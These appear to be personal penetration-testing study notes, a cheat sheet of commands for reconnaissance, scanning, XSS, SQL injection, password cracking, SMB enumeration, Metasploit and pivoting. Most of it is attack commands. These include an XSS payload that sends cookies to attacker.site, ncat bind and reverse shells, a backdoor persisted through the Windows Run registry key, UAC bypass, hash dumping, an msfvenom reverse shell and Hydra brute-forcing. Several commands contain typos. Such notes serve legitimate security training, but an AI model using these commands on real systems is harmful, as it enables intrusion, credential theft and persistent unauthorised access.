1) **Checking the routing table**
	1) Windows -> **route print** 
	2) Linux -> **ip route** 
	3) **Before routing check the routing tables first**
	4) To Forward the IP we use command **ip route add 192.168.222.0/24 via 10.175.34.1**
		1) were 192.168 network is to be forwarded and 10.175.34.1 is gateway of the other network
	5) Resource - [https://devconnected.com/how-to-add-route-on-linux/#:~:text=Ubuntu or CentOS.-,Add route on Linux using ip,be used for this route.&text=By default%2C if you don,loopback excluded%2C will be selected](https://devconnected.com/how-to-add-route-on-linux/#:~:text=Ubuntu%20or%20CentOS.-,Add%20route%20on%20Linux%20using%20ip,be%20used%20for%20this%20route.&text=By%20default%2C%20if%20you%20don,loopback%20excluded%2C%20will%20be%20selected).



**`<br />`**
**Information Gathering**
2) On Linux we can perform **whois** command and on windows we can install Systinternals whois 
	1) Example whois apple.com
<br> 
**`<br />`**
3) **Subdomain Enumeration**
	1) site:company.com on google search engine 
	2) also we can search for `dnsdumpster.com`
	3) sublist3r in kali `sublist3r -v -d google.com`
	4) To Brute force the subdomains we can use subbrute and use names.txt as the wordlist which is present inside the sublist3r directory .  
		1) Usage : `sublist3r -v -d yahoo.com -b`
	5) we can also use virustotal search tab
	6) we can search for ssl certificates `https://crt.sh`
	7) Another tool is amass we can use` amass enum -v -src -ip -brute -min-for-recursive 2 -d domain-name`

**`<br />`**
**Scanning and Enumeration**
4) To see which hosts are alive in the network we use 
	  a)  fping : `fping -a -g IPRANGE`   ->  `fping -a -g 10.54.12.0/24  2>dev/null`
	  b) my preference : `fing -a -r IPRANGE`
	  c) my preference  : `nmap -sn IPRANGE -iL hostlist.txt` we can use other flags like -sL -Pn instead of sn 
	  d) my preference : `sudo netdiscover -i interface` 
	  e) Another example `nmap -sT IP`
	  f) To see which hosts are alive and we need to find the OS `nmap -Pn -O target`
	  g) Limit the hosts that are alive only `nmap -O --osscan-limi target`
	  h) scan all ports `nmap -sC -sV -A -T2 target -o details.nmap`
	  i) masscan command `masscan -p8080 -Pn --rate=800 --banners 10.0.1.0/24 -e tap0 --router-ip 10.0.1.4 --echo > masscan.conf`
	

 **`<br />`**
 **Fingerprinting with Netcat**

 5) Banner Grabbing
	 1) `nc target port` then hit enter 2 times for HTTP
	 2) `openssl s_client -connect target:443`
	 3) `httprint -P0 -h target -s signature_file` we can find signatures on /usr/share/httprint/signatures.txt
**`<br />`**
 **HTTP Methods** ( my preference to do via BURP)
  6) Methods 
	 1) GET -> request a resource .
		 1) GET /page.php HTTP/1.1
	 2) POST -> submit a request with various params
		 1) POST /login.php HTTP/1.1
			 HOST: xyz.com
			 username=abc&password=123
	 3) HEAD = GET
	 4) PUT -> upload a file on a web server for misconfigurations
	 5) DELETE -> remove a file from server 
	 6) OPTIONS -> used to check which  files are availible 
	 7) wc -m payload.php 
		1) Payload = 
		
	``nc victim.site 80
	PUT /payload.php HTTP/
	Content-type:text/html
	Content-length: 136
	payload above present``

**`<br />`**
7) Directories and File Enumeration
	1) **Dirbuster**
		1) put the detail like I know
	2) **Dirb** 
			1) `dirb http://google.com /usr/share/wordlist/small.txt`
			2)  cookies `dirb http://google.com /usr/share/wordlist/small.txt -c "COOKIE" `
			3) credentials `dirb http://google.com /usr/share/wordlist/small.txt -u "admin:pass"`
			4) Extensions `dirb http://google.com /usr/share/wordlist/small.txt -X .php,.css,.bak,.config`
			5) -z is used for time delay if there is an web application firewall present 
<br> **`<br />`**
8) **Google Hacking**
	1) `inurl`
	2) `intitle`
	3) `site`
	4) `filetype`
**`<br />`**
9) **XSS**
	1) using strings like `<i>` `<plaintext> ` `<script>alert(document.cookie)</script>` 
	2) we can find better payloads here `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection` 
	3) we can send cookies to ourselves
		1) ```<script> var i=new Image(); i.src="http://attacker.site/log.php?q="+document.cookie; </script>
		2)   ```
		3) using comment section or search  bar check for xss 
		4) check by `<H1> hello <H1>`
		5) use xsser by 
			1) `xsser -u 'target-where-payload has to inserted.php' -p 'in place of payload enter XSS just like using ffuf' --auto`
			2) this will generate a payload list if vuln exist

**`<br />`**
10) **SQL Injections**
	1) Union statement `Select Name, Description FROM Products Where ID='3' UNION SELECT Username, Password FROM Accounts;` 
	2) payload `' OR 'a'='a` 
	3) SQLMAP
		1) `sqlmap -u URL -p injection_parameter`
		2) `sqlmap -u IP?id=12 -p id --technique=U` 
		3) `sqlmap -u --data=<POST String> -p parameter`
		4) `sqlmap -u <target with parameter> --tables`
		5) `sqlmap -u <target with parameter> --current-db selfie4you -columns `
		6) `sqlmap -u <target with parameter> --current-db selfie4you --dump`
		7) `sqlmap -u <target with parameter> --current-db selfie4you -T users --columns `
		8) `sqlmap -u <target with parameter> --current-db selfie4you -T users -C username,password --dump`
		9) Login page `sqlmap -u <target/login.php> --data='user=a&pass=a'  -p user --technique=B --banner`

**`<br />`**

11) **NCAT**
	1) on victim machine install a binary of ncat and use the command `winconfig -l -p port_number -e cmd.exe` (Here attacker is initiating the connection and victim ie windows is listening in step 1 and step 2)
	2) on attacker machine  ` ncat victim IP:port `
	3) In this step kali machine is listening for and windows is sending connection `ncat -l -p port -v `
	4) in windows `winconfig -e cmd.exe IP:prt `
	5) for persistant backdoor use the command 
		1) in linux use `ncat -l -p port -v`
		2) in windows we go to `Computer\HKLM\SOFTWARE\MICROSOFT\Windows\CurrentVersion\Run` and create new string value  name:winconfig and value `"C:\Windows\System32\winconfig.exe IP listening_port -e cmd.exe"` 
	6) In meterpreter shell use `exploit/windows/local/s4u_persistance` 
	7) set session and set trigger logon
	8) set payload windows/meterpreter/reverse_tcp
	9) set lhost ,lport
**`<br />`**

11) **John** 
	1) `unshadow PASSWORD-FILE SHADOW-FILE > for_john.txt`
	2) `john --wordlist=/usr/share/wordlists/rockyou.txt for_john.txt`
**`<br />`**
12) **Hashcat** 
	1) hashcat -m module number -a 0 wordlist hash.txt

**`<br />`**


13) **Hydra**
	1) `hydra -l username -P /usr/share/wordlists/rockyou.txt http-post-form IP/site "/login.php:payload-for-username-and-pass:Error Message"` 
	2) `hydra -L /usr/share/wordlists/rockyou.txt -p passwd IP ssh


**`<br />`**

14) **Share**
	1) **Windows**
		1) `\\ServerName\ShareName\file_name`
		2) `\\ComputerName\C$,admin$,ipc$`
		3) `\\localhost\<sharename>`
		4) Windows share using -> `nbtstat -A IP` once the attacker understand the file server is running . can use `NEW View <target IP>`  
		5) `NET USE \\IP\IPC$ "/u:"` 
	 2) **Linux**
		 1) FOLLOW THE ORDER 
		 2) `enum4linux -n  target` = if contains 20 this means open shares
		 3) `enum4linux -P target` = for password policy enumeration 
		 4) `enum4linux -S target` = enumerate the shares on the target
		 5) `enum4linux -s /usr/share/enum4linux/share-list.txt target`
		 6) `enum4linux -U target` user enumneration 
		 7) `smbclient //demo.ine.local/share -N`  check if we can login without pass 
		 8) tool = /opt/impacket-0.9.19/examples/samrdump.py
		 9) `nmap --script=smb-brute target`
		 10) `smbclient \\\\IP\share -N ` connect to share
		10) `smbclient //IP/share -U username `
		11)  `nmap --script=smb-enum-shares target` = to list down the shares
		12)  `nmap --script=smb-enum-users target`
			check the users and their shares and check users if shares not present  


**`<br />`**




15) **Metasploit and meterpreter** 
	1) service postgresql start , service metasploit start
	2) we can scan network by `use aux/scanner/discovery/arp_sweep`
	3) tcp scan ``use aux/scanner/portscan/tcp`
	4) and using and exploiting vuln
	5) to escalate privs we can use `getsystem` command and modern windows blocks that so we use `exploit/windows/local/bypassuac` to bypass UAC module 
	6) we can use `hashdump` command in meterpreter or we can use `post/windows/gather/hashdump` to dump the hashes 
	7) To get our process id `getpid`
	8) to create a reverse shell payload using msfvenom
		1) `msfvenom -p linux/x64/shell_reverse_tcp lhost=IP lport=port -f elf -o reverse53`
		2) stable = `python -c "import pty;pty.spawn('/bin/bash')"`
	9) convert a normal shell to meterpreter shell 
		1) initial payload set payload php/reverse_php
		2) exploit 
		3) background it 
		4) use `post /multi/manage/shell_to_meterpreter`



**`<br />`**

16) **Wireshark Basics**
	1) Wireshark Filters
		1) `ip`   only packets using IP as layer 3 
		2) `not ip`  reverse of above
		3) `tcp port 80` packets where source and destination TCP port is 80
		4) `net 192.168.54.0/24` packets to and from specified network
		5) `src port 1234` The source port must be 1234; the transport protocol does not matter
		6) `src net 192.168.1.0/24` The source ip must be specified in network
		7) `host 192.168.45.65` all the packets to or from specified port
		8) `host www.examplehost.com` All the packets from or to the specified hostname  
		9) pg 34-36 wireshark study guide 

**`<br />`**



17) **Pivoting and Port Forwarding** 
	1) use meterpreter auto route `autoroute add -s subnet -n network meterpreter-session-id`
	2) Then we scan the subnet for open victims using `use auxiliary/scanner/portscan/tcp` 
	3) Then we have to pivot to the host machine using `portfwd add –l 3389 –p 3389 –r  [target host]`
		1) -l is the listening host on ATTACKER machine
		2) -p is the actual port open we discovered using portscan
		3) -r identified open machine using portscan 
			1) Resources  = https://www.offensive-security.com/metasploit-unleashed/portfwd/
			2) Resources = https://www.offensive-security.com/metasploit-unleashed/pivoting/